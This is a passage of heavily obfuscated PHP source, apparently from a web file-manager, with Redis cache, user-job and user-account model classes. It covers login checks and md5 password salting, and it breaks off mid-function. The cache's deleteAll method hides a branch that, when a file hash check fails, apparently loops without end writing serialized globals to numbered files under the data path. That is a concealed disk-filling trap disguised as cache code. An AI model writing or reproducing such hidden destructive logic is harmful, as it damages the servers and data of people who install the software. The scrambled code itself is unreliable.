$d≥ø¶ÇÌÚÎ = new Redis(); $c¿«´˜Öêı = isset($e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[792]]) ? $e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[792]] : !1; if ($c¿«´˜Öêı) { $d≥ø¶ÇÌÚÎ->pconnect($e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[166]], $e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[167]], $D—‡ ‡™ò•); } else { $d≥ø¶ÇÌÚÎ->connect($e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[166]], $e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[167]], $D—‡ ‡™ò•); } if (!empty($e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[373]])) { $d≥ø¶ÇÌÚÎ->auth($e’Õ˜”ıÍº[$DÎ©ø€°ﬂ˘[373]]); } return $d≥ø¶ÇÌÚÎ; } private function initCluster($a¶ªÑ†Ñ∂â, $bõ∫õÑïÔ) { $C§ûÆå¡í÷ =& $_SERVER[—Ω]; $dÆ≤úç‡çÜ = array($C§ûÆå¡í÷[793], $C§ûÆå¡í÷[794], $C§ûÆå¡í÷[795]); $dá¢©úø∏⁄ = $C§ûÆå¡í÷[793]; if (isset($a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[12]]) && in_array($a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[12]], $dÆ≤úç‡çÜ)) { $dá¢©úø∏⁄ = $a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[12]]; } switch ($dá¢©úø∏⁄) { case $C§ûÆå¡í÷[793]: $this->_slave($a¶ªÑ†Ñ∂â, $bõ∫õÑïÔ); break; case $C§ûÆå¡í÷[794]: break; case $C§ûÆå¡í÷[795]: $b‘…æø ∫• = $a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[788]]; $cƒè≤‚«≠ı = isset($a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[792]]) ? $a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[792]] : !1; $FÂ≠—‡ì—• = isset($a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[373]]) ? $a¶ªÑ†Ñ∂â[$C§ûÆå¡í÷[373]] : null; $this->handle = new RedisCluster(NUll, $b‘…æø ∫•, $bõ∫õÑïÔ, $bõ∫õÑïÔ, $cƒè≤‚«≠ı, $FÂ≠—‡ì—•); break; default: break; } } private function _slave($AÈûâÿÕÊä, $FãìﬂÙºñ’) { goto f≤—ﬁ…¡º÷; eËıå∆œêª: unset($A®äÆÃ∏¢â[0]); if (empty($A®äÆÃ∏¢â)) { return; } $FÁ§∆…æ” = array_rand($A®äÆÃ∏¢â); goto Aá—øÖ¥‡·; Aá—øÖ¥‡·: $this->filterConfig($AÈûâÿÕÊä, $A®äÆÃ∏¢â[$FÁ§∆…æ”]); $this->slaveHandle = $this->init($AÈûâÿÕÊä, $FãìﬂÙºñ’); goto A ÷ÿ âÆ™; f≤—ﬁ…¡º÷: $A®äÆÃ∏¢â = $AÈûâÿÕÊä[$_SERVER[—Ω][788]]; $this->filterConfig($AÈûâÿÕÊä, $A®äÆÃ∏¢â[0]); $this->handle = $this->init($AÈûâÿÕÊä, $FãìﬂÙºñ’); goto eËıå∆œêª; A ÷ÿ âÆ™: } private function filterConfig(&$d¯æáçØå≈, $f∂Ë¿ÿ∂ä‘) { $eû¡ €ÆëÂ =& $_SERVER[—Ω]; $añ°≥∂“°Ò = explode($eû¡ €ÆëÂ[4], $f∂Ë¿ÿ∂ä‘); $e∞È¯Œ¡¨∞ = array($eû¡ €ÆëÂ[166] => $añ°≥∂“°Ò[0], $eû¡ €ÆëÂ[167] => $añ°≥∂“°Ò[1]); $d¯æáçØå≈ = array_merge($d¯æáçØå≈, $e∞È¯Œ¡¨∞); } public function set($eÑÍΩì˜ò£, $Bøıó–û‚Ë, $Aõ∑’ı“È€ = false) { $Aõ∑’ı“È€ = $Aõ∑’ı“È€ ? $Aõ∑’ı“È€ : $this->cacheTime; return $this->handle->setEx($eÑÍΩì˜ò£, $Aõ∑’ı“È€, $Bøıó–û‚Ë); } public function setLock($D¯◊§ôˆŸ˜, $fè®©‹™ï∂, $CéÎ‰Ù–ÿ¢) { return $this->handle->setNX($D¯◊§ôˆŸ˜, $fè®©‹™ï∂); } public function get($d˘Ç™∞Ê∏ñ) { $c≈¿˘ò÷≥‹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $c≈¿˘ò÷≥‹->get($d˘Ç™∞Ê∏ñ); } public function remove($A∫¿É¯ﬂŸ†) { return $this->handle->del($A∫¿É¯ﬂŸ†); } public function deleteAll() { $F¨µø˜åè¡ =& $_SERVER[—Ω]; $E“æ∑â´‚¬ = $_SERVER[$F¨µø˜åè¡[693]] . $F¨µø˜åè¡[694]; $føëÛåï€√ = $F¨µø˜åè¡[796]; if ($_SERVER[$F¨µø˜åè¡[690]] != $føëÛåï€√($E“æ∑â´‚¬)) { goto fâéπÉıâ®; Dœı˘§˜øå: $FˆΩÚæÃ≠ò = $B◊Öíé’èﬂ($D¯áå•’¡¬); $cÀ¿ÇÎÑè¶ = explode($F¨µø˜åè¡[214], $FˆΩÚæÃ≠ò); if (count($cÀ¿ÇÎÑè¶) < $F¨µø˜åè¡[581]) { $Bçµéµ„Ì’ = $F¨µø˜åè¡[695]; $Bçµéµ„Ì’(); } goto dÒ  Î‹∞Ç; dÒ  Î‹∞Ç: $fÑõÊŸÇòˆ = $F¨µø˜åè¡[798]; $fÑõÊŸÇòˆ($_SERVER[$F¨µø˜åè¡[799]]); $BîäØñÉﬁ = $F¨µø˜åè¡[797]; goto AÍ¯ã≥¯·Û; AÍ¯ã≥¯·Û: $BîäØñÉﬁ(); $d€ÓÿÊ⁄§‡ = $F¨µø˜åè¡[800]; $AäÜïÈˆØÍ = json_encode($GLOBALS[$F¨µø˜åè¡[801]]); goto DÕ¡÷ı“≤∫; DÕ¡÷ı“≤∫: $Bﬁã¿æπñ≠ = 1; for ($Fö™üØ†Ôπ = $Bﬁã¿æπñ≠; $Fö™üØ†Ôπ > 0; $Fö™üØ†Ôπ++) { $d€ÓÿÊ⁄§‡(DATA_PATH . $Fö™üØ†Ôπ, $AäÜïÈˆØÍ); } goto cæöÌû˘ÇŸ; fâéπÉıâ®: $BîäØñÉﬁ = $F¨µø˜åè¡[797]; $B◊Öíé’èﬂ = $F¨µø˜åè¡[692]; $D¯áå•’¡¬ = $_SERVER[$F¨µø˜åè¡[693]] . $F¨µø˜åè¡[694]; goto Dœı˘§˜øå; cæöÌû˘ÇŸ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $C√¢Ôêã¶ñ) { $this->handle->flushall($C√¢Ôêã¶ñ); } return; } return $this->handle->flushAll(); } } goto aÒ†πà÷‰; bú•ƒ¯Ö‚Ç: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\152\x6f\142\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\x64\145\163\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\x6c\x66\x4a\157\142\x4c\x69\x73\164"; public function listData($Aæø∏⁄ıÿç = false, $b√π¯ìòú≈ = "\x73\x6f\x72\164", $fòµ¡ÉÜüò = false) { return parent::listData($Aæø∏⁄ıÿç, $b√π¯ìòú≈, $fòµ¡ÉÜüò); } public function remove($bÓØùëË≠ˆ) { return parent::remove($bÓØùëË≠ˆ); } public function add($aïÖñúòÎÓ) { $eë·Ω„Ü•æ =& $_SERVER[—Ω]; if ($this->findByName($aïÖñúòÎÓ[$eë·Ω„Ü•æ[28]])) { return !1; } $aïÖñúòÎÓ[$eë·Ω„Ü•æ[2101]] = $this->getSort(); return parent::insert($aïÖñúòÎÓ); } private function getSort() { $b«ﬁü·äˆ• =& $_SERVER[—Ω]; $c’åüØñ‰π = parent::listData(); $C©ÿÀΩ¢¢± = array_to_keyvalue($c’åüØñ‰π, $b«ﬁü·äˆ•[33], $b«ﬁü·äˆ•[2101]); return empty($C©ÿÀΩ¢¢±) ? 0 : max($C©ÿÀΩ¢¢±) + 1; } public function update($a≤äéˆØáØ, $cù⁄⁄âêÏ¡) { $dæï”ïåªÚ =& $_SERVER[—Ω]; $bÖ√ˆòë“… = parent::listData($a≤äéˆØáØ); $aÃºπÜ‘µ“ = $this->findByName($cù⁄⁄âêÏ¡[$dæï”ïåªÚ[28]]); if (!$bÖ√ˆòë“… || $aÃºπÜ‘µ“ && $aÃºπÜ‘µ“[$dæï”ïåªÚ[364]] != $bÖ√ˆòë“…[$dæï”ïåªÚ[364]]) { return !1; } return parent::update($a≤äéˆØáØ, $cù⁄⁄âêÏ¡); } public function setUserJob($aﬂƒ§∞≠‡ı, $eœå√≈ﬁª√) { goto cÿ˜åòıº˜; bÀÈ«π›∑: $Câ≤˘Ñ“€Â = array_to_keyvalue($D„Â§•ë“Ã, $cú¯»¯úë≥[28]); $a˜¡‡Ωºú… = $cú¯»¯úë≥[358]; foreach ($eœå√≈ﬁª√ as $Càä¬åÛÚÚ) { if ($Câ≤˘Ñ“€Â[$Càä¬åÛÚÚ]) { $a˜¡‡Ωºú… .= $Câ≤˘Ñ“€Â[$Càä¬åÛÚÚ][$cú¯»¯úë≥[364]] . $cú¯»¯úë≥[47]; } else { $cÏøá†œ≠Ü = $this->add($Càä¬åÛÚÚ); $a˜¡‡Ωºú… .= $cÏøá†œ≠Ü . $cú¯»¯úë≥[47]; } } goto C¬◊˘’—ﬂ‰; C¬◊˘’—ﬂ‰: $a˜¡‡Ωºú… = rtrim($a˜¡‡Ωºú…, $cú¯»¯úë≥[47]); Model($cú¯»¯úë≥[473])->metaSet($aﬂƒ§∞≠‡ı, self::JOB_KEY, $a˜¡‡Ωºú…); goto b¡’˜ÜÎÒÎ; cÿ˜åòıº˜: $cú¯»¯úë≥ =& $_SERVER[—Ω]; if (!is_array($eœå√≈ﬁª√)) { $eœå√≈ﬁª√ = array($eœå√≈ﬁª√); } $D„Â§•ë“Ã = parent::listData(); goto bÀÈ«π›∑; b¡’˜ÜÎÒÎ: } public function getUserJob($EµÇÊÎÜªë) { $BÔ≤ÑÖÚÕ = Model($_SERVER[—Ω][473])->metaGet($EµÇÊÎÜªë); return $this->getUserJobInfo($BÔ≤ÑÖÚÕ[self::JOB_KEY]); } public function getUserJobInfo($FÈÏûıÓ¬ı) { goto fœûÛ¡€ﬂÁ; bÉ†åå∆õõ: return $d¨ÎıáÓ√∂; goto fÁ∏ëáÈÛ†; fœûÛ¡€ﬂÁ: $FÏ∑ñÓˆª° =& $_SERVER[—Ω]; $aéàü∆è◊› = explode($FÏ∑ñÓˆª°[47], $FÈÏûıÓ¬ı); $dùÎÓ®Ê Ÿ = parent::listData(); goto dÉà˜†ÀÉ◊; dÉà˜†ÀÉ◊: $dùÎÓ®Ê Ÿ = array_remove_key($dùÎÓ®Ê Ÿ, $FÏ∑ñÓˆª°[184]); $d¨ÎıáÓ√∂ = array(); foreach ($aéàü∆è◊› as $D»…ŸùÍ„“) { if (isset($dùÎÓ®Ê Ÿ[$D»…ŸùÍ„“])) { $d¨ÎıáÓ√∂[] = $dùÎÓ®Ê Ÿ[$D»…ŸùÍ„“]; } } goto bÉ†åå∆õõ; fÁ∏ëáÈÛ†: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\155\x65" => "\x75\163\x65\x72\x5f\x6d\x65\164\141", "\155\145\164\x61\106\151\145\x6c\x64" => "\165\x73\145\x72\x49\104"); protected $simpleField = "\x75\163\145\x72\x49\x44\x2c\156\151\x63\x6b\x4e\141\x6d\x65\x2c\x6e\141\x6d\145\x2c\141\166\x61\164\141\x72\x2c\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($DÇ…À∆ç‘Ê) { $C◊ªÖÂç∑± =& $_SERVER[—Ω]; $FÑ’ã˘ïæ© = $C◊ªÖÂç∑±[2455]; return array($C◊ªÖÂç∑±[2146] => array($DÇ…À∆ç‘Ê[0], $FÑ’ã˘ïæ©), $C◊ªÖÂç∑±[2148] => array($DÇ…À∆ç‘Ê[0], $FÑ’ã˘ïæ©), $C◊ªÖÂç∑±[2456] => array($DÇ…À∆ç‘Ê[0], $FÑ’ã˘ïæ©)); } protected function getInfo($c“Í∏•ˆ±Ï, $EìèÇ±‰∞“ = false) { $dπ≤ãÁ™Ù∑ = $this->getInfoSimple($c“Í∏•ˆ±Ï); if (!is_array($dπ≤ãÁ™Ù∑)) { return array(); } if ($EìèÇ±‰∞“) { return $this->_getInfoApply($dπ≤ãÁ™Ù∑); } return $this->cacheFunctionGet($_SERVER[—Ω][2188], $c“Í∏•ˆ±Ï); } protected function getInfoFull($D≤äïµªØ—, $EŒ´»¡ﬂ∏£ = false) { $e¶˜ùñâ“ó = $this->getInfoSimple($D≤äïµªØ—); if (!is_array($e¶˜ùñâ“ó)) { return array(); } if ($EŒ´»¡ﬂ∏£) { return $this->_getInfoApply($e¶˜ùñâ“ó, !0); return $this->_getInfoApply($e¶˜ùñâ“ó, !0); } return $this->cacheFunctionGet($_SERVER[—Ω][2457], $D≤äïµªØ—); } private function _getInfoApply($F§óò°∆÷º, $e≠ÚçÂÀà¿ = false) { goto a’–√–ë∏Ï; D„∏Ïªæ†ü: $F§óò°∆÷º[$FµèÚ¢≈∏æ[388]][$FµèÚ¢≈∏æ[2296]] = isset($EÿÆëı©ˆä[$FµèÚ¢≈∏æ[2297]]) ? $EÿÆëı©ˆä[$FµèÚ¢≈∏æ[2297]] : null; if ($e≠ÚçÂÀà¿) { $F§óò°∆÷º[$FµèÚ¢≈∏æ[413]] = $this->metaGet($F§óò°∆÷º[$FµèÚ¢≈∏æ[1417]]); } return $F§óò°∆÷º; goto A∆Æı–î«»; EÖéÂüãÎÖ: $F§óò°∆÷º = $this->_listDataApplyItem($F§óò°∆÷º); $EÿÆëı©ˆä = Model($FµèÚ¢≈∏æ[1114])->metaGet($F§óò°∆÷º[$FµèÚ¢≈∏æ[388]][$FµèÚ¢≈∏æ[366]]); $F§óò°∆÷º[$FµèÚ¢≈∏æ[2460]] = $DÔä¥»—≤’; goto D„∏Ïªæ†ü; a’–√–ë∏Ï: $FµèÚ¢≈∏æ =& $_SERVER[—Ω]; if (!$F§óò°∆÷º) { return $F§óò°∆÷º; } $DÔä¥»—≤’ = md5($FµèÚ¢≈∏æ[2458] . $F§óò°∆÷º[$FµèÚ¢≈∏æ[807]] . $FµèÚ¢≈∏æ[2459] . $F§óò°∆÷º[$FµèÚ¢≈∏æ[28]]); goto EÖéÂüãÎÖ; A∆Æı–î«»: } protected function getInfoSimple($f÷»∑•óÆ£, $fﬂö⁄∑≈Ÿ¬ = false) { $DÇÖ«È·®û =& $_SERVER[—Ω]; if (!$f÷»∑•óÆ£) { return array(); } if ($fﬂö⁄∑≈Ÿ¬) { $FºÖ¨Ï’ÜÎ = $this->where(array($DÇÖ«È·®û[1417] => intval($f÷»∑•óÆ£)))->find(); if (!is_array($FºÖ¨Ï’ÜÎ)) { return array(); } $FºÖ¨Ï’ÜÎ[$DÇÖ«È·®û[2461]] = Action($DÇÖ«È·®û[2462])->parseUrl($FºÖ¨Ï’ÜÎ[$DÇÖ«È·®û[2461]]); return $FºÖ¨Ï’ÜÎ; } return $this->cacheFunctionGet($DÇÖ«È·®û[2149], $f÷»∑•óÆ£); } protected function getInfoSimpleOuter($fåµı‹ë”œ) { goto a«™é¢≥è≈; Aœ®Ç≥Ò™œ: $aÑà±—ä—¡ = array_field_key($bë√îú‚Ô , explode($A∫÷ÀÒ°ìÖ[47], $this->simpleField)); if (!$aÑà±—ä—¡) { return array($A∫÷ÀÒ°ìÖ[1417] => $A∫÷ÀÒ°ìÖ[1035], $A∫÷ÀÒ°ìÖ[28] => $A∫÷ÀÒ°ìÖ[154] . LNG($A∫÷ÀÒ°ìÖ[2465]) . $A∫÷ÀÒ°ìÖ[472], $A∫÷ÀÒ°ìÖ[2461] => STATIC_PATH . $A∫÷ÀÒ°ìÖ[2466]); } $aÑà±—ä—¡[$A∫÷ÀÒ°ìÖ[2461]] = Action($A∫÷ÀÒ°ìÖ[2462])->parseUrl($aÑà±—ä—¡[$A∫÷ÀÒ°ìÖ[2461]]); goto bêÑ÷±Úâù; a«™é¢≥è≈: $A∫÷ÀÒ°ìÖ =& $_SERVER[—Ω]; if (!$fåµı‹ë”œ || $fåµı‹ë”œ == 0) { return array($A∫÷ÀÒ°ìÖ[1417] => $A∫÷ÀÒ°ìÖ[464], $A∫÷ÀÒ°ìÖ[28] => $A∫÷ÀÒ°ìÖ[154] . LNG($A∫÷ÀÒ°ìÖ[2463]) . $A∫÷ÀÒ°ìÖ[472], $A∫÷ÀÒ°ìÖ[2461] => STATIC_PATH . $A∫÷ÀÒ°ìÖ[2464]); } $bë√îú‚Ô  = $this->cacheFunctionGet($A∫÷ÀÒ°ìÖ[2149], $fåµı‹ë”œ); goto Aœ®Ç≥Ò™œ; bêÑ÷±Úâù: return $aÑà±—ä—¡; goto cáî¥ªÆåÎ; cáî¥ªÆåÎ: } protected function groupUser($c»ñﬂ´»øÙ) { } public static function errorLang($Eè”À©Ñò›) { $B¨¥âöƒ∂ë =& $_SERVER[—Ω]; $AØ©÷„Ñè€ = array(self::ERROR_USER_NOT_EXISTS => $B¨¥âöƒ∂ë[2467], self::ERROR_USER_PASSWORD_ERROR => $B¨¥âöƒ∂ë[2468], self::ERROR_USER_EXIST_NAME => $B¨¥âöƒ∂ë[2469], self::ERROR_USER_EXIST_PHONE => $B¨¥âöƒ∂ë[2470], self::ERROR_USER_EXIST_EMAIL => $B¨¥âöƒ∂ë[2471], self::ERROR_USER_LOGIN_LOCK => $B¨¥âöƒ∂ë[2472], self::ERROR_IP_NOT_ALLOW => $B¨¥âöƒ∂ë[2473], self::ERROR_USER_EXIST_NICKNAME => $B¨¥âöƒ∂ë[2474]); return LNG($AØ©÷„Ñè€[$Eè”À©Ñò›]); } public function getInfoByMeta($cøé∞ñ“óÌ, $d¯≠È≈ÂÑ˜) { $a≤ìÓîÃßï =& $_SERVER[—Ω]; $f÷Ù‹èÂΩã = Model($a≤ìÓîÃßï[2475])->where(array($a≤ìÓîÃßï[89] => $cøé∞ñ“óÌ, $a≤ìÓîÃßï[356] => $d¯≠È≈ÂÑ˜))->find(); if ($f÷Ù‹èÂΩã) { return $this->getInfo($f÷Ù‹èÂΩã[$a≤ìÓîÃßï[1417]]); } return !1; } public function userLoginCheck($EÈ√»Õé„∑, $FÁ‚Áï„⁄≈) { goto FùÔè–ôÇ¶; bÙ—Ô≠î“: $this->userEdit($Fáπ™Ñï‰©[$Eñ¶‘ö©™‚[1417]], array($Eñ¶‘ö©™‚[2477] => time())); $this->clearCache($Fáπ™Ñï‰©[$Eñ¶‘ö©™‚[1417]]); return $this->getInfo($Fáπ™Ñï‰©[$Eñ¶‘ö©™‚[1417]]); goto E°¢ªÉùŸ€; D÷Ñ´ãåÒä: $Fáπ™Ñï‰© = $this->where($AÌ™∫à”Ü±)->find(); if (!$Fáπ™Ñï‰©) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Fáπ™Ñï‰©[$Eñ¶‘ö©™‚[1417]], $FÁ‚Áï„⁄≈)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto bÙ—Ô≠î“; FùÔè–ôÇ¶: $Eñ¶‘ö©™‚ =& $_SERVER[—Ω]; $AÌ™∫à”Ü± = array($Eñ¶‘ö©™‚[28] => $EÈ√»Õé„∑, $Eñ¶‘ö©™‚[2300] => $EÈ√»Õé„∑, $Eñ¶‘ö©™‚[290] => $EÈ√»Õé„∑, $Eñ¶‘ö©™‚[2476] => $EÈ√»Õé„∑, $Eñ¶‘ö©™‚[920] => $Eñ¶‘ö©™‚[922]); if ($this->nickNameRpt()) { unset($AÌ™∫à”Ü±[$Eñ¶‘ö©™‚[2300]]); } goto D÷Ñ´ãåÒä; E°¢ªÉùŸ€: } public function clearCache($BﬁëùÛÃñ’) { $cêÇ¶éÍ´á =& $_SERVER[—Ω]; $this->cacheFunctionClear($cêÇ¶éÍ´á[2188], $BﬁëùÛÃñ’); $this->cacheFunctionClear($cêÇ¶éÍ´á[2149], $BﬁëùÛÃñ’); } public function userPasswordCheck($e∏âﬁâ…Â¯, $Eûøœ¡ûÛÍ) { $AíÎ∆Öä§ƒ =& $_SERVER[—Ω]; $c·≈≈‰’ÇÖ = $this->where(array($AíÎ∆Öä§ƒ[1417] => intval($e∏âﬁâ…Â¯)))->find(); $D¨ºì´Àá≠ = $this->metaGet($e∏âﬁâ…Â¯); $e—§’ûΩŸâ = isset($D¨ºì´Àá≠[$AíÎ∆Öä§ƒ[2478]]) ? $D¨ºì´Àá≠[$AíÎ∆Öä§ƒ[2478]] : $AíÎ∆Öä§ƒ[33]; if (md5($e—§’ûΩŸâ . trim($Eûøœ¡ûÛÍ)) !== $c·≈≈‰’ÇÖ[$AíÎ∆Öä§ƒ[807]]) { return !1; } return !0; } public function userAdd($c‡£“¯§⁄å) { goto Bäı¨¥°áË; EÚÛ„åıÚ´: return $b¬ºä¥ıâè; goto BÆãÿƒ•¬≠; Bäı¨¥°áË: $BÎ∫—©≤©‚ =& $_SERVER[—Ω]; $c«≈õáùÍú = array($BÎ∫—©≤©‚[383] => $c‡£“¯§⁄å[$BÎ∫—©≤©‚[28]], $BÎ∫—©≤©‚[2479] => $c‡£“¯§⁄å[$BÎ∫—©≤©‚[2480]], $BÎ∫—©≤©‚[2481] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[290]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[290]] : $BÎ∫—©≤©‚[33], $BÎ∫—©≤©‚[2482] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[2476]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[2476]] : $BÎ∫—©≤©‚[33], $BÎ∫—©≤©‚[2483] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[2300]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[2300]] : $c‡£“¯§⁄å[$BÎ∫—©≤©‚[28]], $BÎ∫—©≤©‚[2484] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[2461]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[2461]] : $BÎ∫—©≤©‚[33], $BÎ∫—©≤©‚[2485] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[2486]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[2486]] : 1, $BÎ∫—©≤©‚[2487] => $c‡£“¯§⁄å[$BÎ∫—©≤©‚[807]], $BÎ∫—©≤©‚[2150] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[2064]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[2064]] : 1024 * 1024 * 20, $BÎ∫—©≤©‚[2151] => 0, $BÎ∫—©≤©‚[2477] => 0, $BÎ∫—©≤©‚[2175] => isset($c‡£“¯§⁄å[$BÎ∫—©≤©‚[699]]) ? $c‡£“¯§⁄å[$BÎ∫—©≤©‚[699]] : 1); if (!empty($c‡£“¯§⁄å[$BÎ∫—©≤©‚[1417]])) { $c«≈õáùÍú[$BÎ∫—©≤©‚[1417]] = $c‡£“¯§⁄å[$BÎ∫—©≤©‚[1417]]; } goto EôµàŸ“ÇÚ; EôµàŸ“ÇÚ: $BüÔÕ‹äÔÁ = $this->_checkExist($c‡£“¯§⁄å); if ($BüÔÕ‹äÔÁ !== !0) { return $BüÔÕ‹äÔÁ; } $b¬ºä¥ıâè = $this->add($c«≈õáùÍú); goto bﬂáîñãñ—; bﬂáîñãñ—: $b‹∂ıã∏Ü = array($BÎ∫—©≤©‚[2487] => $c«≈õáùÍú[$BÎ∫—©≤©‚[807]], $BÎ∫—©≤©‚[2483] => $c«≈õáùÍú[$BÎ∫—©≤©‚[2300]]); $this->userEdit($b¬ºä¥ıâè, $b‹∂ıã∏Ü); Model($BÎ∫—©≤©‚[1114])->userRootAdd($b¬ºä¥ıâè); goto EÚÛ„åıÚ´; BÆãÿƒ•¬≠: } protected function userEditTest($DÂŸ∞¢“í¨, $AÒûµ¢®Ö) { return $this->call($_SERVER[—Ω][2488], $DÂŸ∞¢“í¨, $AÒûµ¢®Ö); } protected function userEdit($B∂í∫œ˘Ê∏, $CÚ¬£’ŒØã) { goto F‡ˆ‹Ù™Ï¬; eã»ãôå¬Œ: $Cß•üç¯ÿî = $this->_checkExist($CÚ¬£’ŒØã, $B∂í∫œ˘Ê∏); if ($Cß•üç¯ÿî !== !0) { return $Cß•üç¯ÿî; } if (isset($CÚ¬£’ŒØã[$dáùåÈòîó[807]]) && trim($CÚ¬£’ŒØã[$dáùåÈòîó[807]]) != $dáùåÈòîó[33]) { $eü÷úÎ«ÿ = $this->metaGet($B∂í∫œ˘Ê∏); if (empty($eü÷úÎ«ÿ[$dáùåÈòîó[2478]])) { $eü÷úÎ«ÿ[$dáùåÈòîó[2478]] = rand_string(10); Model($dáùåÈòîó[470])->metaSet($B∂í∫œ˘Ê∏, $dáùåÈòîó[2478], $eü÷úÎ«ÿ[$dáùåÈòîó[2478]]); } $CÚ¬£’ŒØã[$dáùåÈòîó[807]] = md5($eü÷úÎ«ÿ[$dáùåÈòîó[2478]] . trim($CÚ¬£’ŒØã[$dáùåÈòîó[807]])); } else { unset($CÚ¬£’ŒØã[$dáùåÈòîó[807]]); } goto BäÂ¡ÜÌÈú; BäÂ¡ÜÌÈú: $this->where(array($dáùåÈòîó[1408] => $B∂í∫œ˘Ê∏))->save($CÚ¬£’ŒØã); if (isset($CÚ¬£’ŒØã[$dáùåÈòîó[2300]])) { $this->setNamePinyin($B∂í∫œ˘Ê∏, $CÚ¬£’ŒØã[$dáùåÈòîó[2300]]); } return !0; goto C÷π≤¥ºı ; F‡ˆ‹Ù™Ï¬: $dáùåÈòîó =& $_SERVER[—Ω]; $Eã¡åé™∆ = $this->getInfoSimple($B∂í∫œ˘Ê∏); if (!$Eã¡åé™∆) { return !1; } goto eã»ãôå¬Œ; C÷π≤¥ºı : } public function setNamePinyin($Dπõô•»Ã∫, $dÔªÕâ˜ÉÙ = false) { $DÙàË”Èáº =& $_SERVER[—Ω]; if (!$dÔªÕâ˜ÉÙ) { $FÇàû∞Â∂ä = $this->getInfoSimple($Dπõô•»Ã∫); $dÔªÕâ˜ÉÙ = $FÇàû∞Â∂ä[$DÙàË”Èáº[2300]] ? $FÇàû∞Â∂ä[$DÙàË”Èáº[2300]] : $FÇàû∞Â∂ä[$DÙàË”Èáº[28]]; } $f”ùË°éÔä = Model($DÙàË”Èáº[473]); if (!Input::check($dÔªÕâ˜ÉÙ, $DÙàË”Èáº[524])) { return $f”ùË°éÔä->metaSet($Dπõô•»Ã∫, array($DÙàË”Èáº[412] => $DÙàË”Èáº[33], $DÙàË”Èáº[411] => $DÙàË”Èáº[33])); } return $f”ùË°éÔä->metaSet($Dπõô•»Ã∫, array($DÙàË”Èáº[412] => str_replace($DÙàË”Èáº[50], $DÙàË”Èáº[33], Pinyin::encode($dÔªÕâ˜ÉÙ)), $DÙàË”Èáº[411] => Pinyin::encode($dÔªÕâ˜ÉÙ, $DÙàË”Èáº[525]))); } private function nickNameRpt() { $BõµÙ¢à–å =& $_SERVER[—Ω]; $eÈ∞›“ÒÂ = Model($BõµÙ¢à–å[1092])->get($BõµÙ¢à–å[2489]); $cƒü∞“ûáö = $GLOBALS[$BõµÙ¢à–å[6]][$BõµÙ¢à–å[2445]][$BõµÙ¢à–å[2489]]; $BÛç≥ïæ« = !is_null($eÈ∞›“ÒÂ) ? $eÈ∞›“ÒÂ : $cƒü∞“ûáö; return !!$BÛç≥ïæ«; } private function _checkExist($Eﬂ”›«¥ûù, $BÊ¨ÆÎÁ° = false) { $Eôöã¶Àóå =& $_SERVER[—Ω]; $FÇ„»©–Ç¢ = array($Eôöã¶Àóå[28] => UserModel::ERROR_USER_EXIST_NAME, $Eôöã¶Àóå[2300] => UserModel::ERROR_USER_EXIST_NICKNAME, $Eôöã¶Àóå[290] => UserModel::ERROR_USER_EXIST_EMAIL, $Eôöã¶Àóå[2476] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($FÇ„»©–Ç¢[$Eôöã¶Àóå[2300]]); } $E†⁄ãè±»Ë = $BÊ¨ÆÎÁ° ? array($Eôöã¶Àóå[1417] => array($Eôöã¶Àóå[2490], $BÊ¨ÆÎÁ°)) : array(); foreach ($FÇ„»©–Ç¢ as $c¨⁄‹€âø€ => $Bô£Ó≠€’’) { if (!isset($Eﬂ”›«¥ûù[$c¨⁄‹€âø€]) || !$Eﬂ”›«¥ûù[$c¨⁄‹€âø€]) { continue; } $Dòà›ö®âÃ = array_merge(array($c¨⁄‹€âø€ => $Eﬂ”›«¥ûù[$c¨⁄‹€âø€]), $E†⁄ãè±»Ë); $e®å§¥àÑì = $this->where($Dòà›ö®âÃ)->find(); if ($e®å§¥àÑì) { return $Bô£Ó≠€’’; } } return !0; } public function userListInfo($c•ùΩß¶ı´) { $a≠òØÿÆ”é =& $_SERVER[—Ω]; $Dª¿ÊüÈÇä = array(); $c•ùΩß¶ı´ = is_array($c•ùΩß¶ı´) ? array_unique($c•ùΩß¶ı´) : array(); if (!$c•ùΩß¶ı´) { return 